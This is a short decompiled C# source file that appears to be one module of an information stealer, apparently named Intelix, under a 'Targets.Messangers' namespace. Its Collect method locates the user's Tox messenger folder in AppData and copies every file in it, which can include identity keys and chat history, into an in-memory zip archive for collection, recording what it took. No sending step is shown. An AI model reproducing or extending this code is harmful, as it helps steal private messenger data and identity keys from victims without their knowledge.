using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers
{
	// Token: 0x02000021 RID: 33
	public class Tox : ITarget
	{
		// Token: 0x06000065 RID: 101 RVA: 0x00004B94 File Offset: 0x00002D94
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Tox");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				string text2 = "Tox";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Tox";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Messangers.Add(counterApplications);
			}
		}
	}
}
